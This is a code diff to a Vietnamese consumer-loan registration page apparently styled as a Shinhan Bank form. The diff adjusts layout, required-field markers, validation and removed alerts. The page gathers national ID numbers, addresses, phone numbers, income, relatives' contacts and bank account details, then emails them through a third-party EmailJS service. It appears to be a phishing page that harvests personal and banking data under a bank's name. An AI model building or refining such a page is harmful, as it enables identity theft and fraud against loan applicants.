@@ -73,6 +73,7 @@
             font-size: 14px;
             width: 100%;
             margin: 0 5px;
+            white-space: nowrap; /* Ngăn xuống dòng trên mobile */
         }
         .nav-tabs .nav-link.active {
             background-color: #0033a0;
@@ -242,6 +243,8 @@
             position: relative;
             margin-bottom: 5px;
             padding-bottom: 5px;
+        }
+        .form-group-bordered {
             border-bottom: 1px solid #d3d3d3;
         }
         .form-group:last-child {
@@ -277,6 +280,7 @@
         }
         .row-group .form-group {
             flex: 1;
+            border-bottom: 1px solid #d3d3d3; /* Giữ dấu gạch xám cho Có nợ xấu và Có nợ chú ý */
         }
     </style>
 </head>
@@ -299,7 +303,6 @@
     </div>
 
     <div class="container">
-        <h5 class="mb-3" style="color: #0033a0; font-weight: 700; font-size: 18px;">ĐĂNG KÝ VAY</h5>
         <ul class="nav-tabs">
             <li class="nav-item">
                 <a class="nav-link active" href="#">1. Nhập thông tin</a>
@@ -320,70 +323,61 @@
             <div class="mb-2">
                 <label class="section-title">THÔNG TIN CÁ NHÂN</label>
                 <div class="form-group">
-                    <label class="form-label">Họ và Tên</label>
+                    <label class="form-label">Họ và Tên <span>*</span></label>
                     <input type="text" class="form-control long" id="fullName">
-                    <div class="invalid-feedback">Vui lòng nhập thông tin.</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Ngày tháng năm sinh</label>
-                    <input type="text" class="form-control ultra-short" id="dob">
-                    <div class="invalid-feedback">Vui lòng nhập thông tin.</div>
+                    <label class="form-label">Ngày sinh <span>*</span></label>
+                    <input type="text" class="form-control ultra-short" id="dob" placeholder="DD/MM/YYYY">
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Giới tính</label>
+                    <label class="form-label">Giới tính <span>*</span></label>
                     <select class="form-select ultra-short" id="gender">
                         <option value="" disabled selected>Chọn giới tính</option>
                         <option value="Nam">Nam</option>
                         <option value="Nữ">Nữ</option>
                         <option value="Khác">Khác</option>
                     </select>
-                    <div class="invalid-feedback">Vui lòng chọn thông tin.</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Địa chỉ thường trú</label>
+                    <label class="form-label">Địa chỉ thường trú <span>*</span></label>
                     <input type="text" class="form-control long" id="contactAddress">
-                    <div class="invalid-feedback">Vui lòng nhập thông tin.</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Quê quán</label>
+                    <label class="form-label">Quê quán <span>*</span></label>
                     <input type="text" class="form-control long" id="hometown">
-                    <div class="invalid-feedback">Vui lòng nhập thông tin.</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Số định danh cá nhân (CCCD/CMND)</label>
+                    <label class="form-label">Số định danh cá nhân (CCCD/CMND) <span>*</span></label>
                     <input type="text" class="form-control short" id="idNumber">
-                    <div class="invalid-feedback">Vui lòng nhập thông tin.</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Ngày cấp CMND/CCCD</label>
+                    <label class="form-label">Ngày cấp CMND/CCCD <span>*</span></label>
                     <input type="text" class="form-control ultra-short" id="idIssueDate">
-                    <div class="invalid-feedback">Vui lòng nhập thông tin.</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Quốc tịch</label>
+                    <label class="form-label">Quốc tịch <span>*</span></label>
                     <select class="form-select short" id="nationality">
                         <option value="" disabled selected>Chọn quốc tịch</option>
                         <option value="Việt Nam">Việt Nam</option>
                         <option value="Khác">Khác</option>
                     </select>
-                    <div class="invalid-feedback">Vui lòng chọn thông tin.</div>
                 </div>
 
-                <div class="form-group">
-                    <label class="form-label">Nơi cấp</label>
+                <div class="form-group form-group-bordered">
+                    <label class="form-label">Nơi cấp <span>*</span></label>
                     <select class="form-select long" id="idIssuePlace">
                         <option value="" disabled selected>Chọn nơi cấp</option>
                         <option value="CỤC TRƯỜNG CỤC CẢNH SÁT QUẢNG LÍ HÀNH CHÍNH VỀ TRẬT TỰ XÃ HỘI (CTCCSQLACVTTXH)">CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
                         <option value="Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư">Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư</option>
                     </select>
-                    <div class="invalid-feedback">Vui lòng chọn thông tin.</div>
                 </div>
             </div>
 
@@ -392,21 +386,19 @@
             <div class="mb-2">
                 <label class="section-title">THÔNG TIN ĐĂNG KÝ</label>
                 <div class="form-group">
-                    <label class="form-label">Số điện thoại</label>
-                    <input type="tel" class="form-control short" id="phoneNumber">
-                    <div class="invalid-feedback">Vui lòng nhập thông tin.</div>
+                    <label class="form-label">Số điện thoại <span>*</span></label>
+                    <input type="text" class="form-control short" id="phoneNumber">
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">E-mail</label>
-                    <input type="email" class="form-control medium" id="email">
+                    <label class="form-label">E-mail <span>*</span></label>
+                    <input type="text" class="form-control medium" id="email">
                     <div class="form-note">** Bạn sẽ nhận được nhiều thông tin hướng dẫn quy trình đăng ký thông qua email</div>
-                    <div class="invalid-feedback">Vui lòng nhập thông tin.</div>
                 </div>
 
                 <div class="row-group">
                     <div class="form-group">
-                        <label class="form-label">Hình thức vay</label>
+                        <label class="form-label">Hình thức vay <span>*</span></label>
                         <select class="form-select short" id="loanType">
                             <option value="" disabled selected>Chọn Hình thức vay</option>
                             <option value="Vay tín chấp">Vay tín chấp</option>
@@ -414,11 +406,10 @@
                             <option value="Vay thấu chi">Vay thấu chi</option>
                             <option value="Vay trả góp">Vay trả góp</option>
                         </select>
-                        <div class="invalid-feedback">Vui lòng chọn thông tin.</div>
                     </div>
 
                     <div class="form-group">
-                        <label class="form-label">Thời hạn vay yêu cầu</label>
+                        <label class="form-label">Thời hạn vay yêu cầu <span>*</span></label>
                         <select class="form-select ultra-short" id="loanTerm">
                             <option value="" disabled selected>Chọn số tháng</option>
                             <option value="6">6 tháng</option>
@@ -429,12 +420,11 @@
                             <option value="48">48 tháng</option>
                             <option value="60">60 tháng</option>
                         </select>
-                        <div class="invalid-feedback">Vui lòng chọn thông tin.</div>
                     </div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Số tiền vay yêu cầu (VND)</label>
+                    <label class="form-label">Số tiền vay yêu cầu (VND) <span>*</span></label>
                     <select class="form-select short" id="loanAmountInput">
                         <option value="" disabled selected>Chọn số tiền</option>
                         <option value="10000000">10,000,000</option>
@@ -454,23 +444,20 @@
                         <option value="500000000">500,000,000</option>
                         <option value="khac">Khác</option>
                     </select>
-                    <div class="invalid-feedback">Vui lòng chọn thông tin.</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Dự kiến giải ngân ngày</label>
+                    <label class="form-label">Dự kiến giải ngân ngày <span>*</span></label>
                     <input type="text" class="form-control ultra-short" id="disbursementDate">
-                    <div class="invalid-feedback">Vui lòng nhập thông tin.</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Thu nhập hàng tháng (VND)</label>
+                    <label class="form-label">Thu nhập hàng tháng (VND) <span>*</span></label>
                     <input type="text" class="form-control short" id="income">
-                    <div class="invalid-feedback">Vui lòng nhập thông tin.</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Nghề nghiệp</label>
+                    <label class="form-label">Nghề nghiệp <span>*</span></label>
                     <select class="form-select short" id="occupation">
                         <option value="" disabled selected>Chọn nghề nghiệp</option>
                         <option value="Kỹ sư">Kỹ sư</option>
@@ -482,11 +469,10 @@
                         <option value="Hưu trí">Hưu trí</option>
                         <option value="Khác">Khác</option>
                     </select>
-                    <div class="invalid-feedback">Vui lòng chọn thông tin.</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Mục đích vay</label>
+                    <label class="form-label">Mục đích vay <span>*</span></label>
                     <select class="form-select short" id="loanPurpose">
                         <option value="" disabled selected>Chọn mục đích vay</option>
                         <option value="Mua nhà">Mua nhà</option>
@@ -497,17 +483,15 @@
                         <option value="Tiêu dùng">Tiêu dùng</option>
                         <option value="Khác">Khác</option>
                     </select>
-                    <div class="invalid-feedback">Vui lòng chọn thông tin.</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Số điện thoại người thân</label>
-                    <input type="tel" class="form-control short" id="companyPhone">
-                    <div class="invalid-feedback">Vui lòng nhập thông tin.</div>
+                    <label class="form-label">Số điện thoại người thân <span>*</span></label>
+                    <input type="text" class="form-control short" id="companyPhone">
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Quan hệ</label>
+                    <label class="form-label">Quan hệ <span>*</span></label>
                     <select class="form-select short" id="companyAddress">
                         <option value="" disabled selected>Chọn quan hệ</option>
                         <option value="Bạn bè">Bạn bè</option>
@@ -520,28 +504,25 @@
                         <option value="Mẹ">Mẹ</option>
                         <option value="Khác">Khác</option>
                     </select>
-                    <div class="invalid-feedback">Vui lòng chọn thông tin.</div>
                 </div>
 
                 <div class="row-group">
                     <div class="form-group">
-                        <label class="form-label">Có nợ xấu</label>
+                        <label class="form-label">Có nợ xấu <span>*</span></label>
                         <select class="form-select ultra-short" id="hasBadDebt">
                             <option value="" disabled selected>Chọn</option>
                             <option value="Có">Có</option>
                             <option value="Không">Không</option>
                         </select>
-                        <div class="invalid-feedback">Vui lòng chọn thông tin.</div>
                     </div>
 
                     <div class="form-group">
-                        <label class="form-label">Có nợ chú ý</label>
+                        <label class="form-label">Có nợ chú ý <span>*</span></label>
                         <select class="form-select ultra-short" id="hasHighDebt">
                             <option value="" disabled selected>Chọn</option>
                             <option value="Có">Có</option>
                             <option value="Không">Không</option>
                         </select>
-                        <div class="invalid-feedback">Vui lòng chọn thông tin.</div>
                     </div>
                 </div>
             </div>
@@ -551,19 +532,17 @@
             <div class="mb-2">
                 <label class="section-title">TÀI KHOẢN GIẢI NGÂN</label>
                 <div class="form-group">
-                    <label class="form-label">Tên chủ tài khoản</label>
+                    <label class="form-label">Tên chủ tài khoản <span>*</span></label>
                     <input type="text" class="form-control long" id="accountHolderName">
-                    <div class="invalid-feedback">Vui lòng nhập thông tin.</div>
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Số tài khoản</label>
+                    <label class="form-label">Số tài khoản <span>*</span></label>
                     <input type="text" class="form-control short" id="accountNumber">
-                    <div class="invalid-feedback">Vui lòng nhập thông tin.</div>
                 </div>
 
-                <div class="form-group">
-                    <label class="form-label">Tên ngân hàng</label>
+                <div class="form-group form-group-bordered">
+                    <label class="form-label">Tên ngân hàng <span>*</span></label>
                     <select class="form-select short" id="bankName">
                         <option value="" disabled selected>Chọn ngân hàng</option>
                         <option value="Shinhan Bank">Shinhan Bank</option>
@@ -590,7 +569,6 @@
                         <option value="LienVietPostBank">LienVietPostBank</option>
                         <option value="SAIGONBANK">SAIGONBANK</option>
                     </select>
-                    <div class="invalid-feedback">Vui lòng chọn thông tin.</div>
                 </div>
             </div>
 
@@ -686,7 +664,7 @@
 
         function formatNumberInput(value) {
             if (!value) return "";
-            return Number(value.replace(/[^0-9]/g, '')).toLocaleString('vi-VN');
+            return value; // Bỏ định dạng, cho phép nhập tự do
         }
 
         function formatDateInput(input) {
@@ -711,7 +689,7 @@
         function calculateMonthlyPayment(loanAmount, term) {
             if (!loanAmount || !term || loanAmount <= 0) return 0;
             const monthlyRate = 0.075 / 12;
-            const months = parseInt(term);
+            const months = parseInt(term) || 0;
             return Math.round((loanAmount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -months)));
         }
 
@@ -727,35 +705,34 @@
 
         function validateForm() {
             let isValid = true;
-            const errors = [];
 
             // List of all fields that must be filled
             const requiredFields = [
-                { id: 'fullName', selector: '#fullName' },
-                { id: 'dob', selector: '#dob' },
-                { id: 'gender', selector: '#gender' },
-                { id: 'contactAddress', selector: '#contactAddress' },
-                { id: 'hometown', selector: '#hometown' },
-                { id: 'idNumber', selector: '#idNumber' },
-                { id: 'idIssueDate', selector: '#idIssueDate' },
-                { id: 'nationality', selector: '#nationality' },
-                { id: 'idIssuePlace', selector: '#idIssuePlace' },
-                { id: 'phoneNumber', selector: '#phoneNumber' },
-                { id: 'email', selector: '#email' },
-                { id: 'loanType', selector: '#loanType' },
-                { id: 'loanTerm', selector: '#loanTerm' },
-                { id: 'loanAmountInput', selector: '#loanAmountInput' },
-                { id: 'disbursementDate', selector: '#disbursementDate' },
-                { id: 'income', selector: '#income' },
-                { id: 'occupation', selector: '#occupation' },
-                { id: 'loanPurpose', selector: '#loanPurpose' },
-                { id: 'companyPhone', selector: '#companyPhone' },
-                { id: 'companyAddress', selector: '#companyAddress' },
-                { id: 'hasBadDebt', selector: '#hasBadDebt' },
-                { id: 'hasHighDebt', selector: '#hasHighDebt' },
-                { id: 'accountHolderName', selector: '#accountHolderName' },
-                { id: 'accountNumber', selector: '#accountNumber' },
-                { id: 'bankName', selector: '#bankName' }
+                { id: 'fullName', selector: '#fullName', label: 'Họ và Tên' },
+                { id: 'dob', selector: '#dob', label: 'Ngày sinh' },
+                { id: 'gender', selector: '#gender', label: 'Giới tính' },
+                { id: 'contactAddress', selector: '#contactAddress', label: 'Địa chỉ thường trú' },
+                { id: 'hometown', selector: '#hometown', label: 'Quê quán' },
+                { id: 'idNumber', selector: '#idNumber', label: 'Số định danh cá nhân (CCCD/CMND)' },
+                { id: 'idIssueDate', selector: '#idIssueDate', label: 'Ngày cấp CMND/CCCD' },
+                { id: 'nationality', selector: '#nationality', label: 'Quốc tịch' },
+                { id: 'idIssuePlace', selector: '#idIssuePlace', label: 'Nơi cấp' },
+                { id: 'phoneNumber', selector: '#phoneNumber', label: 'Số điện thoại' },
+                { id: 'email', selector: '#email', label: 'E-mail' },
+                { id: 'loanType', selector: '#loanType', label: 'Hình thức vay' },
+                { id: 'loanTerm', selector: '#loanTerm', label: 'Thời hạn vay yêu cầu' },
+                { id: 'loanAmountInput', selector: '#loanAmountInput', label: 'Số tiền vay yêu cầu (VND)' },
+                { id: 'disbursementDate', selector: '#disbursementDate', label: 'Dự kiến giải ngân ngày' },
+                { id: 'income', selector: '#income', label: 'Thu nhập hàng tháng (VND)' },
+                { id: 'occupation', selector: '#occupation', label: 'Nghề nghiệp' },
+                { id: 'loanPurpose', selector: '#loanPurpose', label: 'Mục đích vay' },
+                { id: 'companyPhone', selector: '#companyPhone', label: 'Số điện thoại người thân' },
+                { id: 'companyAddress', selector: '#companyAddress', label: 'Quan hệ' },
+                { id: 'hasBadDebt', selector: '#hasBadDebt', label: 'Có nợ xấu' },
+                { id: 'hasHighDebt', selector: '#hasHighDebt', label: 'Có nợ chú ý' },
+                { id: 'accountHolderName', selector: '#accountHolderName', label: 'Tên chủ tài khoản' },
+                { id: 'accountNumber', selector: '#accountNumber', label: 'Số tài khoản' },
+                { id: 'bankName', selector: '#bankName', label: 'Tên ngân hàng' }
             ];
 
             // Reset all fields to valid state initially
@@ -764,25 +741,29 @@
             });
 
             // Check each field for emptiness
-            requiredFields.forEach(field => {
+            for (const field of requiredFields) {
                 const value = $(field.selector).val();
                 if (!value || value.trim() === "" || value === "") {
                     $(field.selector).addClass('is-invalid').removeClass('valid');
                     isValid = false;
-                    errors.push(`${field.id}: Missing value`);
-                } else {
-                    $(field.selector).removeClass('is-invalid').addClass('valid');
-                }
-            });
-
-            if (!isValid) {
-                console.log('Validation errors:', errors);
-                const firstInvalid = $('#registerForm .is-invalid').first();
-                if (firstInvalid.length) {
                     $('html, body').animate({
-                        scrollTop: firstInvalid.offset().top - 50
+                        scrollTop: $(field.selector).offset().top - 50
                     }, 500);
-                    firstInvalid.focus();
+                    $(field.selector).focus();
+                    break; // Dừng lại ngay khi tìm thấy mục chưa nhập
+                }
+            }
+
+            // Check email format if all fields are filled
+            if (isValid) {
+                const emailField = $('#email').val().trim();
+                if (!emailField || !emailField.includes('@')) {
+                    $('#email').addClass('is-invalid').removeClass('valid');
+                    isValid = false;
+                    $('html, body').animate({
+                        scrollTop: $('#email').offset().top - 50
+                    }, 500);
+                    $('#email').focus();
                 }
             }
 
@@ -793,19 +774,11 @@
             // Kiểm tra email hợp lệ
             if (!userData.email || !userData.email.includes('@')) {
                 console.error('Invalid email:', userData.email);
-                alert('Email không hợp lệ. Vui lòng nhập lại.');
+                $('html, body').animate({
+                    scrollTop: $('#email').offset().top - 50
+                }, 500);
                 $('#email').focus();
                 return;
-            }
-
-            // Kiểm tra dữ liệu userData
-            const requiredFields = ['fullName', 'idNumber', 'phoneNumber', 'email'];
-            for (const field of requiredFields) {
-                if (!userData[field]) {
-                    console.error('Missing required field:', field);
-                    alert('Vui lòng điền đầy đủ thông tin trước khi gửi.');
-                    return;
-                }
             }
 
             // Cấu hình params khớp với template và cấu hình EmailJS
@@ -816,11 +789,11 @@
                 id_issue_place: userData.idIssuePlace || '',
                 address: userData.contactAddress || '',
                 occupation: userData.occupation || '',
-                income: userData.income ? Number(userData.income).toLocaleString('vi-VN') + ' VND' : '',
+                income: userData.income || '',
                 phone_number: encryptData(userData.phoneNumber || ''),
                 email: userData.email,
-                loan_amount: userData.loanAmount ? Number(userData.loanAmount).toLocaleString('vi-VN') + ' VND' : '',
-                loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : '',
+                loan_amount: userData.loanAmount || '',
+                loan_term: userData.loanTerm || '',
                 loan_purpose: userData.loanPurpose || '',
                 account_number: encryptData(userData.accountNumber || ''),
                 bank_name: userData.bankName || '',
@@ -839,14 +812,12 @@
             emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
                 .then(() => {
                     console.log('Email sent successfully');
-                    alert("Đã gửi hồ sơ!");
                     localStorage.removeItem('pendingEmail');
                     $('#retryEmailBtn').hide();
                     window.location.href = '/vaytieudung/shinhanbank/pages/vi/step2.html';
                 })
                 .catch(error => {
                     console.error('EmailJS error:', error);
-                    alert("Lỗi gửi hồ sơ. Vui lòng kiểm tra và gửi lại sau.");
                     localStorage.setItem('pendingEmail', JSON.stringify(params));
                     $('#retryEmailBtn').show();
                 });
@@ -869,7 +840,7 @@
             $('#loanTerm').val(userData.loanTerm || '');
             $('#loanAmountInput').val(userData.loanAmount || '');
             $('#disbursementDate').val(userData.disbursementDate || getCurrentDate());
-            $('#income').val(userData.income ? formatNumberInput(userData.income) : '');
+            $('#income').val(userData.income || '');
             $('#occupation').val(userData.occupation || '');
             $('#loanPurpose').val(userData.loanPurpose || '');
             $('#companyPhone').val(userData.companyPhone || '');
@@ -890,12 +861,8 @@
         });
 
         $('#income, #accountNumber').on('input', function() {
-            let value = $(this).val().replace(/[^0-9]/g, '');
-            if (value && this.id !== 'accountNumber') {
-                $(this).val(formatNumberInput(value));
-            } else {
-                $(this).val(value);
-            }
+            let value = $(this).val();
+            $(this).val(value);
         });
 
         $('#retryEmailBtn').on('click', function() {
@@ -907,18 +874,15 @@
                     emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
                         .then(() => {
                             console.log('Retry email sent');
-                            alert("Đã gửi lại hồ sơ!");
                             localStorage.removeItem('pendingEmail');
                             $('#retryEmailBtn').hide();
                             window.location.href = '/vaytieudung/shinhanbank/pages/vi/step2.html';
                         })
                         .catch(error => {
                             console.error('Retry EmailJS error:', error);
-                            alert('Lỗi gửi lại hồ sơ. Vui lòng thử lại sau.');
                         });
                 } catch (error) {
                     console.error('Error retrying pending email:', error);
-                    alert('Thông tin đăng ký không trùng khớp trên hệ thống. Vui lòng thử lại sau.');
                 }
             }
         });
@@ -930,7 +894,7 @@
             $('#storageError, #emailError').hide();
 
             if (validateForm()) {
-                const income = $('#income').val().replace(/[^0-9]/g, '');
+                const income = $('#income').val();
                 const loanAmount = $('#loanAmountInput').val();
                 userData = {
                     fullName: $('#fullName').val().trim(),
@@ -980,7 +944,6 @@
                     sendRegistrationDataEmail();
                 } else {
                     console.error('Failed to save to localStorage, not redirecting');
-                    alert('Thông tin không trùng khớp trên hệ thống. Quý khách vui lòng kiểm tra và thử lại sau.');
                 }
             }
         });
